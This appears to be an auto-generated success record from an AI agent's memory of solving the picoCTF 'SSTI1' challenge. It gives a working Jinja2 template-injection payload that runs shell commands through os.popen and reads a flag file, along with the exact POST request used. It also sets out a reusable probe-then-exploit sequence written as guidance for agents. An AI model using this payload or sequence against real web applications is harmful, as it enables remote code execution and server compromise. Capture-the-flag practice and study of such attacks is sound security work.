# Server-Side Template Injection: When facing a Server-Side Template Injection (engine: Jinja2/Twig) cha

**Type:** experience_success
**Category:** Server-Side Template Injection
**Challenge:** SSTI1
**Challenge URL:** http://rescued-float.picoctf.net:55010/
**Auto-generated:** 2026-03-03
**Tags:** ssti, success, experience, do
**Confidence:** high
**Template engine:** Jinja2/Twig
**Site fingerprint:** title:SSTI1|h1:Home|form:/

**Applies when:** When facing a Server-Side Template Injection (engine: Jinja2/Twig) challenge with these tools available

**Agent takeaway:** Follow this winning tool sequence: http_fetch → javascript_source → form_submit

---

## What Happened

The automated attempt successfully exploited a server-side template injection (SSTI) vulnerability using a payload that accessed the globals of the Jinja2/Twig template engine. This allowed access to the operating system's command execution functionality, ultimately retrieving the flag from a specified location. The method involved confirming the vulnerability through initial reconnaissance and submitting a crafted POST request to obtain the desired outcome. In future attempts, operational security measures could be enhanced, such as implementing stricter validation of inputs and limiting access to sensitive functions. It's crucial to assess potential blocks, such as rate limiting or input sanitization, before proceeding with similar steps.

## Transferable Rule

Do: Follow this winning tool sequence: http_fetch → javascript_source → form_submit

Reason: SSIT vulnerabilities arise when user inputs are not sanitized, allowing attackers to inject code into templates.

## Tools Involved

- `http_fetch`
- `javascript_source`
- `form_submit`

**Full sequence:** http_fetch → javascript_source → form_submit

## Quick Exploitation Path

> **Note:** Replace `<TARGET_URL>` with the current challenge URL.

1. **`http_fetch`**: Fetch the target URL to map the application and identify input forms
2. **`javascript_source`**: Inspect JS for injection points, credentials, or API endpoints
3. **`form_submit`**: Submit a payload via the identified form or API endpoint — use: `{"url":"<TARGET_URL>","method":"POST","data":{"content":"{{ cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}"},"max_body":4000}`

> **Next-step strategy:** Test every input with `{{7*7}}` first. On success, use `ssti_exploit_suggester` for RCE payloads targeting the detected engine.

## Key Exploit Inputs

The following request(s) produced the flag:

- `form_submit` input: {"url":"http://rescued-float.picoctf.net:55010/","method":"POST","data":{"content":"{{ cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}"},"max_body":4000}

**Seq hash:** -1562946244616778138
